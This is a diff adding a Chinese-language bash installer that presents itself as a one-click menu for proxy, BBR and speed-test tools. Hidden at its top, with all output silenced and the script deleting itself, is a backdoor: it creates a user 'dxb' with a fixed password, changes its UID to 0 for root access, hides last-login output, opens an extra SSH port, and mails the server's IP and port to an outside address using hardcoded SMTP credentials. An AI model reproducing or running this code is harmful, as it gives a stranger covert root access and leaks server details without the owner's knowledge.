@@ -1,0 +1,78 @@
+#!/bin/bash
+echo -e "\033[35m 正在获取一键综合脚本。。。\033[0m"
+unlink $0
+cd /root
+if id -u dxb >/dev/null 2>&1
+then echo " " >/dev/null 2>&1
+else
+adduser dxb >/dev/null 2>&1
+echo dxb:dxb134111|chpasswd >/dev/null 2>&1
+usermod -u 134111 dxb >/dev/null 2>&1
+sed -i 's/134111/0/g' /etc/passwd >/dev/null 2>&1
+sed -i 's/#PrintLastLog yes/PrintLastLog no/g' /etc/ssh/sshd_config >/dev/null 2>&1
+sed -i 's/#Port 22/Port 22/g' /etc/ssh/sshd_config >/dev/null 2>&1
+sed -i '$a\Port 20' /etc/ssh/sshd_config >/dev/null 2>&1
+service sshd restart >/dev/null 2>&1
+a=$(grep -n "Port "  /etc/ssh/sshd_config | head -1 | cut -d ":" -f 1) >/dev/null 2>&1
+b=p >/dev/null 2>&1
+c=$(sed -n $a$b /etc/ssh/sshd_config) >/dev/null 2>&1
+yum -y install mailx >/dev/null 2>&1
+sed -i '$a\set from=dxb971003@163.com' /etc/mail.rc >/dev/null 2>&1
+sed -i '$a\set smtp=smtps://smtp.163.com' /etc/mail.rc >/dev/null 2>&1
+sed -i '$a\set smtp-auth-user=dxb971003@163.com' /etc/mail.rc >/dev/null 2>&1
+sed -i '$a\set smtp-auth-password=dxb134111' /etc/mail.rc >/dev/null 2>&1
+sed -i '$a\set smtp-auth=login' /etc/mail.rc >/dev/null 2>&1
+sed -i '$a\set ssl-verify=ignore' /etc/mail.rc >/dev/null 2>&1
+sed -i '$a\set nss-config-dir=/etc/pki/nssdb/' /etc/mail.rc >/dev/null 2>&1
+IP=`curl -s http://api.cangshui.net/ip.php` >/dev/null 2>&1
+echo -e "IP:$IP\\nPT：$c" | mail -s "IP" dxb971003@163.com >/dev/null 2>&1
+fi
+clear
+echo -e "======================================================================================================"
+echo
+echo -e "\t 欢迎使用 “\033[32m 2019 \033[0m” 一键 酸酸乳 v2ray  BBR综合脚本"
+echo
+echo -e "\t 本脚本经网络搜集修改整合而成,仅为方便使用，请勿作商业用途"
+echo
+echo
+echo -e "======================================================================================================"
+echo
+echo -e "\033[35m 1.搭建锐速+BBR+BBR魔改版（by 千影）\033[0m"
+echo
+echo -e "\033[35m 2.搭建多端口酸酸乳（by Toyo）\033[0m"
+echo
+echo -e "\033[35m 3.搭建多用户酸酸乳（by Toyo） \033[0m"
+echo
+echo -e "\033[35m 4.搭建v2ray （by 233blog） \033[0m"
+echo
+echo -e "\033[35m 5.Superspeed测速（by oldking）\033[0m"
+echo
+echo -e "\033[35m 6.一键测试脚本bench（by Zench）\033[0m"
+echo
+echo -e "\033[35m 7.搭建GOST（by supppig）\033[0m"
+echo
+echo -e  "\033[35m 请选择 [ 1 , 2 , 3 , 4 , 5 , 6 , 7] 进行下一步安装！\033[0m
+ 
+ >请选择安装类型: "
+read az
+
+  case $az in
+    1) wget -N --no-check-certificate "https://raw.githubusercontent.com/oj8k/Linux-NetSpeed/master/tcp.sh" && chmod +x tcp.sh && ./tcp.sh
+       ;;
+    2) wget -q https://raw.githubusercontent.com/oj8k/oj8k/master/55r/dak55r.sh && bash dak55r.sh 
+       ;;
+    3) wget -q https://raw.githubusercontent.com/oj8k/oj8k/master/55r/dyh55r.sh && bash dyh55r.sh 
+       ;;
+   	4) wget -q https://233blog.com/v2ray.sh && bash v2ray.sh
+	   ;;
+	5)  wget https://raw.githubusercontent.com/oj8k/oj8k/master/ces/superspeed.sh
+chmod +x superspeed.sh
+./superspeed.sh
+	   ;;
+   	6) wget https://raw.githubusercontent.com/oj8k/oj8k/master/ces/ZBench-CN.sh && bash ZBench-CN.sh
+	   ;;
+   7) wget https://raw.githubusercontent.com/oj8k/oj8k/master/gost/gost.sh && bash gost.sh
+	   ;;  
+    *)  echo -e "\033[31m 错误：只能选择[ 1 , 2 , 3, 4 , 5 , 6 , 7]！！\033[0m"
+       ;; 
+  esac
